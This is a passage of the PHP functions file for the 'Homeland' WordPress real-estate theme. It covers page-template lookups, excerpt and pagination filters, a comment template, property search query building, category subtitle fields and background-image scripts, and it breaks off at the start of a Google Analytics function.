			$homeland_contact_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-contact.php' ) );
			foreach( $homeland_contact_pages as $page ) :
				$homeland_contact_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_about_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-about.php' ) );
			foreach( $homeland_about_pages as $page ) :
				$homeland_about_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_agent_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-agents.php' ) );
			foreach( $homeland_agent_pages as $page ) :
				$homeland_agent_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_services_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-services.php' ) );
			foreach( $homeland_services_pages as $page ) :
				$homeland_services_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_advance_search_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-property-search.php' ) );
			foreach( $homeland_advance_search_pages as $page ) :
				$homeland_advance_search_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_portfolio_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-portfolio.php' ) );
			foreach($homeland_portfolio_pages as $page) :
				$homeland_portfolio_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_login_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-login.php' ) );
			foreach( $homeland_login_pages as $page ) :
				$homeland_login_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_print_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-print.php' ) );
			foreach( $homeland_print_pages as $page ) :
				$homeland_print_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;
		}
	endif;


	/**
	 * Modifies tag cloud widget arguments to display all tags in the 12-18 pixel font size
	 * @param array $args Arguments for tag cloud widget.
	 * @return array The filtered arguments for tag cloud widget.
	 */
	if ( ! function_exists( 'homeland_widget_tag_cloud_args' ) ) :
		function homeland_widget_tag_cloud_args( $args ) {
			$args['largest']  = 18;
			$args['smallest'] = 12;
			$args['unit']     = 'px';
			$args['format']   = '';

			return $args;
		}
	endif;
	add_filter( 'widget_tag_cloud_args', 'homeland_widget_tag_cloud_args' );


	/**
	 * Custom Excerpt Length
	 */
	if( ! function_exists( 'homeland_custom_excerpt_length' ) ) :
		function homeland_custom_excerpt_length( $length ) { 
			global $post;

			$homeland_excerpt_length_blog = get_option( 'homeland_excerpt_length_blog' );
			$homeland_excerpt_length_services = get_option( 'homeland_excerpt_length_services' );
			$homeland_excerpt_length_portfolio = get_option( 'homeland_excerpt_length_portfolio' );
			$homeland_excerpt_length_properties = get_option( 'homeland_excerpt_length_properties' );

			if( $post->post_type == 'post' ) :
			  if( empty( $homeland_excerpt_length_blog ) ) : return 30;
				else : return $homeland_excerpt_length_blog;
				endif;
			elseif( $post->post_type == 'homeland_properties' ) :
			  if( empty( $homeland_excerpt_length_properties ) ) : return 30;
				else : return $homeland_excerpt_length_properties;
				endif;
			elseif( $post->post_type == 'homeland_services' ) :
				if( empty( $homeland_excerpt_length_services ) ) : return 30;
				else : return $homeland_excerpt_length_services;
				endif;
			elseif( $post->post_type == 'homeland_portfolio' ) :
				if( empty( $homeland_excerpt_length_portfolio ) ) : return 30;
				else : return $homeland_excerpt_length_portfolio;
				endif;
			else :
				return 30; 
			endif;
		}
	endif;
	add_filter( 'excerpt_length', 'homeland_custom_excerpt_length', 999 );

	if( ! function_exists( 'homeland_custom_excerpt_more' ) ) :
		function homeland_custom_excerpt_more($more) { return ' ...'; }
	endif;
	add_filter( 'excerpt_more', 'homeland_custom_excerpt_more' );


	/**
	 * Remove Default Comment Fields
	 * @param array $args Arguments for removing default comment fields.
	 */
	if( ! function_exists( 'homeland_remove_comment_fields' ) ) :
		function homeland_remove_comment_fields($arg) {
		  $arg['url'] = '';
		  return $arg;
		}
	endif;
	add_filter( 'comment_form_default_fields', 'homeland_remove_comment_fields' );

	
	/**
	 * Custom Comment Style
	 */
	if( ! function_exists( 'homeland_theme_comment' ) ) :
		function homeland_theme_comment($comment, $args, $depth) {
			$GLOBALS['comment'] = $comment; ?>		
			<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
				<div class="parent clearfix" id="comment-<?php comment_ID(); ?>">					
					<?php echo get_avatar( $comment, 60 ); ?>
					<div class="comment-details">
						<h5><?php comment_author_link(); ?>
							<span>
								<?php echo human_time_diff( get_comment_time('U'), current_time('timestamp') ) . "&nbsp;" . esc_html__( 'ago', 'homeland' ); ?>
								<?php edit_comment_link( esc_html__( 'edit', 'homeland' ), '&nbsp;', '' ); ?>
							</span>	
						</h5> 
						<?php 
							comment_text(); 
							comment_reply_link(
								array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) )
							);
							edit_comment_link( 'edit', '&nbsp;', '' ); 
							if ($comment->comment_approved == '0') : ?><em><?php esc_html_e( 'Your comment is awaiting moderation.', 'homeland' ); ?></em><?php 
							endif; 					
						?>
					</div>
				</div><?php
			$oddcomment = (empty($oddcomment)) ? 'class="alt" ' : '';
		}
	endif;


	/**
	 * Custom Pagination
	 */
	if( ! function_exists( 'homeland_pagination' ) ) :
		function homeland_pagination() {  
			global $wp_query, $homeland_max_num_pages;
			$big = 999999999;
			$search_for   = array( $big, '#038;' );
			$replace_with = array( '%#%', '' );

			if( is_page_template( 'templates/template-agents.php' ) || is_page_template( 'templates/template-agents-fullwidth.php' ) || is_page_template( 'templates/template-agents-list-fullwidth.php' ) || is_page_template( 'templates/template-agents-left-sidebar.php' ) || is_page_template( 'templates/template-agents-grid-right-sidebar.php' ) || is_page_template( 'templates/template-agents-grid-left-sidebar.php' ) ) : 
				$max_num_pages_count = $homeland_max_num_pages;
			else : 
				$max_num_pages_count = $wp_query->max_num_pages;
			endif;

			if( $max_num_pages_count == '1' ) : 
			else : echo '<div class="pagination clearfix">'; 
			endif;
				
			echo paginate_links( array(
				'base' => str_replace( $search_for, $replace_with, esc_url( get_pagenum_link( $big, false ) ) ),
				'format' => '?paged=%#%',
				'prev_next' => true,
				'prev_text' => esc_html__( '&laquo;', 'homeland' ),
	    	'next_text' => esc_html__( '&raquo;', 'homeland' ),
	    	'type' => 'plain',
				'current' => max( 1, get_query_var('paged') ),
				'total' => $max_num_pages_count,
				'type' => 'list',
				'show_all' => false,
				'end_size' => 1,
				'mid_size' => 2,
				'add_args' => false,
				'add_fragment' => '',
				'before_page_number' => '',
				'after_page_number' => ''
			));
			if( $max_num_pages_count == '1' ) : else : echo "</div>"; endif;
		}
	endif;


	/**
	 * Custom Next Previous Link
	 */
	if( ! function_exists( 'homeland_next_previous' ) ) :
		function homeland_next_previous() { ?>
			<div class="pagination">
				<?php
				  global $wp_query, $paged, $homeland_max_num_pages;		

				  if( is_page_template( 'templates/template-agents.php' ) || is_page_template( 'templates/template-agents-fullwidth.php' ) || is_page_template( 'templates/template-agents-list-fullwidth.php' ) || is_page_template( 'templates/template-agents-left-sidebar.php' ) ) : 
				  	$max_num_pages_count = $homeland_max_num_pages;
					else : 
						$max_num_pages_count = $wp_query->max_num_pages;
					endif;

				  if( $paged > 1 ) : ?>
				  	<div class="alignleft"><a href="<?php previous_posts(); ?>">&larr; <?php esc_html_e( 'Previous', 'homeland' ); ?></a></div><?php
				  endif;
				    
				  if( $max_num_pages_count == 1 ) :	    		
			    elseif( $paged < $max_num_pages_count ) : ?>
			    	<div class="alignright"><a href="<?php next_posts(); ?>"><?php esc_html_e( 'Next', 'homeland' ); ?> &rarr;</a></div><?php
			    endif;
				?>
			</div><?php
		}
	endif;


	/**
	 * Fix Pagination for Taxonomies
	 */
	$homeland_posts_per_page = get_option('posts_per_page');
	
	if( ! function_exists( 'homeland_modify_posts_per_page' ) ) :		
		function homeland_modify_posts_per_page() { 
			add_filter( 'option_posts_per_page', 'homeland_option_posts_per_page' ); 
		}
	endif;
	add_action( 'init', 'homeland_modify_posts_per_page', 0 );

	if( ! function_exists( 'homeland_option_posts_per_page' ) ) :	
		function homeland_option_posts_per_page($value) {
			global $homeland_posts_per_page, $wp_query;

			if( is_tax( 'homeland_property_type' ) ) : 
				return $wp_query->max_num_pages;
			elseif( is_tax( 'homeland_property_status' ) ) : 
				return $wp_query->max_num_pages;
			elseif( is_tax( 'homeland_property_location' )) : 
				return $wp_query->max_num_pages;
			elseif( is_tax( 'homeland_property_amenities' ) ) : 
				return $wp_query->max_num_pages;
			elseif( is_author() ) : 
				return $wp_query->max_num_pages;
			elseif( is_post_type_archive( 'homeland_properties' ) ) : 
				return $wp_query->max_num_pages;
			elseif( is_post_type_archive( 'homeland_portfolio' ) ) : 
				return $wp_query->max_num_pages;
			elseif( is_post_type_archive( 'homeland_services' ) ) : 
				return $wp_query->max_num_pages;
			else : 
				return $homeland_posts_per_page; 
			endif;
		}
	endif;


	/**
	 * Fix Pagination for Homepage
	 */
	if( ! function_exists( 'homeland_get_home_pagination' ) ) :	
		function homeland_get_home_pagination() {
			global $paged, $wp_query, $wp;

			$args = wp_parse_args( $wp->matched_query );
			if( !empty($args['paged'] ) && 0 == $paged ) :
				$wp_query->set( 'paged', $args['paged'] );
			  $paged = $args['paged'];
			endif;
		}
	endif;


	/**
	 * Fix Pagination for Agent Page
	 */
	if( ! function_exists( 'homeland_custom_agent_pagination' ) ) :	
		function homeland_custom_agent_pagination($query) {
	    if ( !is_admin() && $query->is_author() && $query->is_main_query() ) :
	    	$query->set( 'post_type', array( 'homeland_properties' ) );
	    	$query->set( 'posts_per_page', get_option( 'homeland_agent_property_limit' ) );
	    	$query->set( 'orderby', get_option( 'homeland_agent_property_orderby' ) );
	    	$query->set( 'order', get_option( 'homeland_agent_property_order' ) );
	   	endif;
		}
		add_action( 'pre_get_posts', 'homeland_custom_agent_pagination' );
	endif;


	/**
	 * Agent Contributor upload files
	 */
	if ( !function_exists( 'homeland_allow_contributor_uploads' ) ) :	
		function homeland_allow_contributor_uploads() {
	 		$contributor = get_role('contributor');
	 		$contributor->add_cap('upload_files');
	 		$contributor->add_cap('can_edit_posts');
		}
	endif;
	//if ( current_user_can('contributor') && !current_user_can('upload_files') )
 	add_action( 'admin_init', 'homeland_allow_contributor_uploads' );


 	/**
	 * Agent Custom Columns in Backend Area
	 */
	function homeland_users_properties_column($homeland_cols) {
  	$homeland_cols['homeland_user_properties'] = esc_html__( 'Listings', 'homeland' );   
  	return $homeland_cols;
	}

	function homeland_user_properties_column_value( $homeland_value, $homeland_column_name, $homeland_id ) {
  	if( $homeland_column_name == 'homeland_user_properties' ) {
    	global $wpdb;
    	$homeland_count = (int) $wpdb->get_var($wpdb->prepare( "SELECT COUNT(ID) FROM $wpdb->posts WHERE post_type = 'homeland_properties' AND post_status = 'publish' AND post_author = %d", $homeland_id ));
    	return $homeland_count;
  	}
	}
	add_filter( 'manage_users_columns', 'homeland_users_properties_column' );
	add_filter( 'manage_users_custom_column', 'homeland_user_properties_column_value', 10, 3 );


	/**
	 * Advance Search
	 */
	if ( ! function_exists( 'homeland_advance_search' ) ) :
		function homeland_advance_search() {
			$homeland_disable_advance_search = get_option( 'homeland_disable_advance_search' );
			$homeland_hide_advance_search = get_option( 'homeland_hide_advance_search' );	

			if( is_front_page() ) : 
				if( empty( $homeland_hide_advance_search ) ) : 
					homeland_advance_search_divs(); 
				else :
					echo "<div class='post-bottom'>&nbsp;</div>";
				endif;
			elseif( is_page() || is_single() || is_archive() || is_author() || is_404() || is_search() ) :
				if( empty( $homeland_disable_advance_search ) ) : 
					homeland_advance_search_divs(); 
				endif;
			endif;
		}
	endif;


	/**
	 * Advance Search Div
	 */
	if ( ! function_exists( 'homeland_advance_search_divs' ) ) :
		function homeland_advance_search_divs() {
			if( is_page_template( 'templates/template-homepage.php' ) || is_page_template( 'templates/template-homepage2.php' ) || is_page_template( 'templates/template-homepage3.php' ) || is_page_template( 'templates/template-homepage4.php' ) || is_page_template( 'templates/template-homepage-video.php' ) || is_page_template( 'templates/template-homepage-revslider.php' ) || is_page_template( 'templates/template-homepage-gmap.php' ) || is_page_template( 'templates/template-homepage-builder.php' ) ) : 
				$homeland_search_class = "advance-search-block post-bottom-5em";
			else : 
				$homeland_search_class = "advance-search-block advance-search-block-page";
			endif;

			echo '<section class="' . esc_attr( $homeland_search_class ) . '" id="advance-search"><div class="inside">';
				if ( is_active_sidebar( 'homeland_search_type' ) ) : 
					dynamic_sidebar( 'homeland_search_type' );
				else : 
					get_template_part( 'template-parts/component/advance-search-form' );
				endif;
			echo '</div></section>';
		}
	endif;


	/**
	 * Advance Property Search 
	 */
	if ( ! function_exists( 'homeland_advance_property_search' ) ) :	
		function homeland_advance_property_search($homeland_search_args) {
			$homeland_tax_query = array();
			$homeland_meta_query = array();
			$homeland_search_query = array();	 	

			if ( ( !empty( $_GET['city'] ) ) ) : 
				$homeland_tax_query[] = array(
					'taxonomy' => 'homeland_property_location', 
					'field' => 'slug', 
					'terms' => $_GET['city']
				); 
			endif;

			if ( ( !empty( $_GET['status'] ) ) ) : 
				$homeland_tax_query[] = array(
					'taxonomy' => 'homeland_property_status', 
					'field' => 'slug', 
					'terms' => $_GET['status']
				); 
			endif;

			if ( ( !empty( $_GET['type'] ) ) ) : 
				$homeland_tax_query[] = array(
					'taxonomy' => 'homeland_property_type', 
					'field' => 'slug', 
					'terms' => $_GET['type']
				); 
			endif;

			if ( ( !empty( $_GET['amenities'] ) ) ) : 
				$homeland_tax_query[] = array(
					'taxonomy' => 'homeland_property_amenities', 
					'field' => 'slug', 
					'terms' => $_GET['amenities']
				); 
			endif;

			if ( ( !empty( $_GET['bed'] ) ) ) : 
				$homeland_meta_query[] = array(
					'key' => 'homeland_bedroom', 
					'value' => $_GET['bed'], 
					'type' => 'NUMERIC', 
					'compare' => '='
				); 
			endif;

			if ( ( !empty( $_GET['bath'] ) ) ) : 
				$homeland_meta_query[] = array(
					'key' => 'homeland_bathroom', 
					'value' => $_GET['bath'], 
					'type' => 'NUMERIC', 
					'compare' => '='
				);
			endif;

			if ( ( !empty( $_GET['pid'] ) ) ) : 
				$homeland_meta_query[] = array(
					'key' => 'homeland_property_id', 
					'value' => $_GET['pid'], 
					'type' => 'CHAR', 
					'compare' => '='
				); 
			endif;

			// Both Minimum and Maximum Price
	    if ( isset( $_GET['min-price'] ) && isset( $_GET['max-price'] ) ) :
	      $homeland_min_price = intval( $_GET['min-price'] );
	      $homeland_max_price = intval( $_GET['max-price'] );
	         
				if ( $homeland_min_price >= 0 && $homeland_max_price > $homeland_min_price ) :
				  $homeland_meta_query[] = array( 
			  		'key' => 'homeland_price', 
			  		'value' => array( $homeland_min_price, $homeland_max_price ), 
			  		'type' => 'NUMERIC', 
			  		'compare' => 'BETWEEN' 
			  	);
				endif;
			endif;
	      
      // Minimum Price
      if ( isset( $_GET['min-price'] ) ) :
      	$homeland_min_price = intval( $_GET['min-price'] );   
      	if( $homeland_min_price > 0 ) : 
      		$homeland_meta_query[] = array( 
      			'key' => 'homeland_price', 
      			'value' => $homeland_min_price, 
      			'type' => 'NUMERIC', 
      			'compare' => '>=' 
      		); 
      	endif;
      endif;

      // Maximum Price
      if ( isset( $_GET['max-price'] ) ) :
        $homeland_max_price = intval( $_GET['max-price'] );
        if( $homeland_max_price > 0 ) : 
        	$homeland_meta_query[] = array( 
        		'key' => 'homeland_price', 
        		'value' => $homeland_max_price, 
        		'type' => 'NUMERIC', 
        		'compare' => '<=' 
        	); 
        endif;
	 		endif;

	 		$homeland_tax_count = count( $homeland_tax_query );
			if ( $homeland_tax_count > 1 ) : $homeland_tax_query['relation'] = 'AND'; 
			endif;

			$homeland_meta_count = count( $homeland_meta_query );
			if ( $homeland_meta_count > 1 ) : 
				$homeland_meta_query['relation'] = 'AND'; 
			endif;
			if ( $homeland_tax_count > 0 ) : 
				$homeland_search_args['tax_query'] = $homeland_tax_query; 
			endif;
			if ( $homeland_meta_count > 0 ) : 
				$homeland_search_args['meta_query'] = $homeland_meta_query; 
			endif;

			if ( isset( $_GET['order'] ) ) :
			  $homeland_search_args['order'] = $_GET['order'] == "ASC" ? 'ASC' : 'DESC'; 
			endif;

			$homeland_search_query[] = array( 'relation' => 'OR',
				array( 'key' => 'homeland_price', 'compare' => 'EXISTS' ), 
        array( 'key' => 'homeland_price', 'compare' => 'NOT EXISTS' )
			);

			if ( isset( $_GET['sortby'] ) ) :
				if ( $_GET['sortby'] == "price" ) :  
					$homeland_search_args['meta_query'] = $homeland_search_query;
					$homeland_search_args['orderby'] = 'meta_value_num';
				elseif ( $_GET['sortby'] == "title" ) : 
					$homeland_search_args['orderby'] = 'title';
				else : 
					$homeland_search_args['orderby'] = 'date';
				endif;
			endif;
			return $homeland_search_args;
	   }
	endif;
  add_filter( 'homeland_advance_search_parameters', 'homeland_advance_property_search' );


	/**
	 * This will Add, Edit and Save New Blog Category Field
	 */
	if( ! function_exists( 'homeland_create_category_fields' ) ) :
		function homeland_create_category_fields( $homeland_tag ) { 
	    $homeland_extra_id = isset( $homeland_tag->term_id );
	    $homeland_cat_meta = get_option("category_$homeland_extra_id"); ?>
			<div class="form-field">
				<label for="homeland_cat_meta[homeland_subtitle]"><?php esc_html_e( 'Subtitle', 'homeland' ); ?></label>
				<input type="text" name="homeland_cat_meta[homeland_subtitle]" id="homeland_cat_meta[homeland_subtitle]" value="<?php echo esc_html( $homeland_cat_meta['homeland_subtitle'] ) ? esc_html( $homeland_cat_meta['homeland_subtitle'] ) : ''; ?>">
			    <p><?php esc_html_e( 'Add your subtitle text here', 'homeland' ); ?></p>
			</div><?php
		}
	endif;

	if( ! function_exists( 'homeland_edit_category_fields' ) ) :
		function homeland_edit_category_fields($homeland_tag) {    
	    $homeland_extra_id = $homeland_tag->term_id;
	    $homeland_cat_meta = get_option("category_$homeland_extra_id"); ?>
			<tr class="form-field">
				<th valign="top" scope="row"><label for="homeland_cat_meta[homeland_subtitle]"><?php esc_html_e( 'Subtitle', 'homeland' ); ?></label></th>
				<td>
					<input type="text" name="homeland_cat_meta[homeland_subtitle]" id="homeland_cat_meta[homeland_subtitle]" value="<?php echo esc_html( $homeland_cat_meta['homeland_subtitle'] ) ? esc_html( $homeland_cat_meta['homeland_subtitle'] ) : ''; ?>">
					<p class="description"><?php esc_html_e( 'Edit your subtitle text here', 'homeland' ); ?></p>
				</td>		        
			</tr><?php
		}
	endif;
	add_action( 'category_edit_form_fields', 'homeland_edit_category_fields' );
	add_action( 'category_add_form_fields', 'homeland_create_category_fields' );

	if( ! function_exists( 'homeland_save_extra_category_fields' ) ) :
		function homeland_save_extra_category_fields($term_id) {
			if(isset($_POST['homeland_cat_meta'])) :
				$homeland_extra_id = $term_id;
				$homeland_cat_meta = get_option("category_$homeland_extra_id");
				$homeland_cat_keys = array_keys($_POST['homeland_cat_meta']);
				foreach ($homeland_cat_keys as $homeland_key) :
					if (isset($_POST['homeland_cat_meta'][$homeland_key])) :
					  $homeland_cat_meta[$homeland_key] = $_POST['homeland_cat_meta'][$homeland_key];
					endif;
				endforeach;
				update_option( "category_$homeland_extra_id", $homeland_cat_meta );        
			endif;
		}
	endif;
	add_action( 'edited_category', 'homeland_save_extra_category_fields' );
	add_action( 'create_category', 'homeland_save_extra_category_fields' );


	/**
	 * Convert Hex to RGBA
	 */
	if( ! function_exists( 'homeland_hex2rgba' ) ) :	
		function homeland_hex2rgba($homeland_color, $homeland_opacity = false) {
			$homeland_default = 'rgb(0,0,0)';
			if(empty($homeland_color))
				return $homeland_default; 
				if($homeland_color[0] == '#') : $homeland_color = substr( $homeland_color, 1 ); endif;

				if(strlen($homeland_color) == 6) :
				   $homeland_hex = array( $homeland_color[0] . $homeland_color[1], $homeland_color[2] . $homeland_color[3], $homeland_color[4] . $homeland_color[5] );
				elseif(strlen( $homeland_color ) == 3) :
				  $homeland_hex = array( $homeland_color[0] . $homeland_color[0], $homeland_color[1] . $homeland_color[1], $homeland_color[2] . $homeland_color[2] );
				else : return $homeland_default;
				endif;

				$homeland_rgb =  array_map('hexdec', $homeland_hex);

				if($homeland_opacity) :
					if(abs($homeland_opacity) > 1)
						$homeland_opacity = 1.0;
						$homeland_output = 'rgba('.implode(",",$homeland_rgb).','.$homeland_opacity.')';
				else :
					$homeland_output = 'rgb('.implode(",",$homeland_rgb).')';
				endif;

				return $homeland_output;
		}	
	endif;


	/**
	 * Custom Responsive Background
	 */
	if( ! function_exists( 'homeland_theme_custom_background' ) ) :	
		function homeland_theme_custom_background() {
			$homeland_bg_type = get_option( 'homeland_bg_type' );	
			$homeland_theme_layout = get_option( 'homeland_theme_layout' );	
			$homeland_forum_single_bgimage = get_option( 'homeland_forum_single_bgimage' );	
			$homeland_forum_single_topic_bgimage = get_option( 'homeland_forum_single_topic_bgimage' );	
			$homeland_forum_topic_edit_bgimage = get_option( 'homeland_forum_topic_edit_bgimage' );	
			$homeland_forum_search_bgimage = get_option( 'homeland_forum_search_bgimage' );
			$homeland_user_profile_bgimage = get_option( 'homeland_user_profile_bgimage' );
			$homeland_forum_bgimage = get_option( 'homeland_forum_bgimage' );	

			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );

			if( function_exists( 'is_bbpress' ) ) :
				if( 'Image' === $homeland_bg_type && ( 'Boxed' === $homeland_theme_layout || 'Boxed Left' === $homeland_theme_layout ) ) :
					if( bbp_is_single_forum() ) :
						if( !empty( $homeland_forum_single_bgimage ) ) :
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_forum_single_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					elseif( bbp_is_single_topic() ) :
						if( !empty( $homeland_forum_single_topic_bgimage ) ) : 
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_forum_single_topic_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );		
						else : homeland_default_img_bg(); endif;	
					elseif( bbp_is_topic_edit() ) :
						if( !empty( $homeland_forum_topic_edit_bgimage ) ) : 
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_forum_topic_edit_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					elseif( bbp_is_search() ) :
						if( !empty( $homeland_forum_search_bgimage ) ) : 
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_forum_search_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					elseif( bbp_is_single_user() ) :
						if( !empty( $homeland_user_profile_bgimage ) ) :
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_user_profile_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					elseif( bbp_is_forum_archive() || is_bbpress() ) :
						if( !empty( $homeland_forum_bgimage ) ) :
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_forum_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					else : homeland_bg_conditions(); endif;
				endif;
			else : homeland_bg_conditions();			
			endif;
		}	
	endif;
	add_action( 'wp_enqueue_scripts', 'homeland_theme_custom_background' );


	/**
	 * Image Background Conditions
	 */
	if( ! function_exists( 'homeland_bg_conditions' ) ) :	
		function homeland_bg_conditions() {
			global $post;

			$homeland_bg_type = get_option( 'homeland_bg_type' );
			$homeland_theme_layout = get_option( 'homeland_theme_layout' );
			$homeland_agent_bgimage = get_option( 'homeland_agent_bgimage' );
			$homeland_taxonomy_bgimage = get_option( 'homeland_taxonomy_bgimage' );
			$homeland_archive_bgimage = get_option( 'homeland_archive_bgimage' );
			$homeland_search_bgimage = get_option( 'homeland_search_bgimage' );
			$homeland_attachment_bgimage = get_option( 'homeland_attachment_bgimage' );
			$homeland_notfound_bgimage = get_option( 'homeland_notfound_bgimage' );

			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );

			if( 'Image' === $homeland_bg_type && ( 'Boxed' === $homeland_theme_layout || 'Boxed Left' === $homeland_theme_layout ) ) :
				// archive 
				if( is_archive() ) :
					if( is_author() ) :
						if( !empty( $homeland_agent_bgimage ) ) : 
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_agent_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					elseif( is_tax() ) :
						if( !empty( $homeland_taxonomy_bgimage ) ) : 
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_taxonomy_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					else :
						if( !empty( $homeland_archive_bgimage ) ) : 
							$homeland_custom_js = "jQuery(window).load(function() { 
								jQuery.backstretch('". esc_url( $homeland_archive_bgimage ) ."'); 
							}); ";
							wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
						else : homeland_default_img_bg(); endif;
					endif;

				// search
				elseif( is_search() ) :
					if( !empty( $homeland_search_bgimage ) ) :
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $homeland_search_bgimage ) ."'); 
						}); ";
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;

				// attachment
				elseif( is_attachment() ) :
					if( !empty( $homeland_attachment_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $homeland_attachment_bgimage ) ."'); 
						}); ";
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;

				// 404 not found
				elseif( is_404() ) :
					if( !empty( $homeland_notfound_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $homeland_notfound_bgimage ) ."'); 
						}); ";		
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );		
					else : homeland_default_img_bg(); endif;	

				// coming soon and login page
				elseif( is_page_template( 'templates/template-coming-soon.php' ) || is_page_template( 'templates/template-login.php' ) ) :	

				// pages
				elseif( is_page() ) :
					if( !empty( $post->homeland_page_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $post->homeland_page_bgimage ) ."'); 
						}); ";		
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;	

				// services background image
				elseif( is_singular( 'homeland_services' ) ) :
					if( !empty( $post->homeland_services_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $post->homeland_services_bgimage ) ."'); 
						}); ";		
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;	

				// portfolio background image
				elseif( is_singular( 'homeland_portfolio' ) ) :
					if( !empty( $post->homeland_portfolio_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $post->homeland_portfolio_bgimage ) ."'); 
						}); ";		
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;	

				// property background image
				elseif( is_singular( 'homeland_properties' ) ) :
					if( !empty( $post->homeland_property_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $post->homeland_property_bgimage ) ."'); 
						}); ";		
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;	

				elseif( is_singular( 'post' ) ) :
					if( !empty( $post->homeland_post_bgimage ) ) : 
						$homeland_custom_js = "jQuery(window).load(function() { 
							jQuery.backstretch('". esc_url( $post->homeland_post_bgimage ) ."'); 
						}); ";		
						wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
					else : homeland_default_img_bg(); endif;	

				// homepage
				elseif( is_home() ) : homeland_default_img_bg();
				else : homeland_default_img_bg(); 
				endif;
			endif;
		}
	endif;


	/**
	 * Default Image Background
	 */
	if( ! function_exists( 'homeland_default_img_bg' ) ) :	
		function homeland_default_img_bg() {
			$homeland_default_bgimage = get_option( 'homeland_default_bgimage' );

			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );

			if( !empty( $homeland_default_bgimage ) ) : 
				$homeland_custom_js = "jQuery(window).load(function() { 
					jQuery.backstretch('". esc_url( $homeland_default_bgimage ) ."'); 
				}); ";	
				wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );	
			else : 
				$homeland_custom_js = "jQuery(window).load(function() { 
					jQuery.backstretch('". esc_url( 'https://qbootstrap.com/wp/Homeland/wp-content/uploads/2015/10/gm-02.jpg' ) ."'); 
				}); ";		
				wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
			endif;
		}	
	endif;


	/**
	 * Google Analytics Code
	 */
	if ( ! function_exists( 'homeland_google_analytics' ) ) :	
		function homeland_google_analytics() {
